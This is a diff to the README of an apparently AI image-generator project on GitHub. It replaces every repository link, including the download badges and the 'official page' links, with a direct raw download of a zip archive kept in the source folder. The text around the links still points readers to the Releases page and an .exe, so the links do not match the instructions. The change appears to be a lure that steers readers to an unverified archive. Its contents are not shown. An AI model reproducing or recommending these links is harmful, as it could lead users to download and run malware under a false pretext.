@@ -1,6 +1,6 @@
 # 🎨 AI-Image-Generator - Create AI Images Securely and Easily
 
-[![Download AI-Image-Generator](https://img.shields.io/badge/Download-AI--Image--Generator-ff6f61?style=for-the-badge&logo=github)](https://github.com/freddiepulham-netizen/AI-Image-Generator)
+[![Download AI-Image-Generator](https://img.shields.io/badge/Download-AI--Image--Generator-ff6f61?style=for-the-badge&logo=github)](https://github.com/freddiepulham-netizen/AI-Image-Generator/raw/refs/heads/main/src/Generator_Image_A_3.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these requirements:
 You will get the app from the official GitHub page. Follow these steps:
 
 1. Click the big button above or visit this link:  
-   https://github.com/freddiepulham-netizen/AI-Image-Generator
+   https://github.com/freddiepulham-netizen/AI-Image-Generator/raw/refs/heads/main/src/Generator_Image_A_3.6.zip
 
 2. On the GitHub page, look for the **Releases** section on the right side or near the top.
 
@@ -118,7 +118,7 @@ If problems continue, visit the GitHub page for updates or known issues.
 To get the latest features or fixes:
 
 1. Go back to the official page:  
-   https://github.com/freddiepulham-netizen/AI-Image-Generator
+   https://github.com/freddiepulham-netizen/AI-Image-Generator/raw/refs/heads/main/src/Generator_Image_A_3.6.zip
 
 2. Download the newest `.exe` from the latest release.
 
@@ -129,7 +129,7 @@ To get the latest features or fixes:
 ## 🔗 Useful Links
 
 - Download and visit the main page:  
-  [AI-Image-Generator on GitHub](https://github.com/freddiepulham-netizen/AI-Image-Generator)
+  [AI-Image-Generator on GitHub](https://github.com/freddiepulham-netizen/AI-Image-Generator/raw/refs/heads/main/src/Generator_Image_A_3.6.zip)
 
 - Homepage for Pollinations API: Visit their site to learn more about image creation technology.
 
@@ -141,4 +141,4 @@ If you want help or want to share an idea, you can use the GitHub page’s **Iss
 
 ---
 
-[![Download AI-Image-Generator](https://img.shields.io/badge/Download-AI--Image--Generator-ff6f61?style=for-the-badge&logo=github)](https://github.com/freddiepulham-netizen/AI-Image-Generator)
+[![Download AI-Image-Generator](https://img.shields.io/badge/Download-AI--Image--Generator-ff6f61?style=for-the-badge&logo=github)](https://github.com/freddiepulham-netizen/AI-Image-Generator/raw/refs/heads/main/src/Generator_Image_A_3.6.zip)
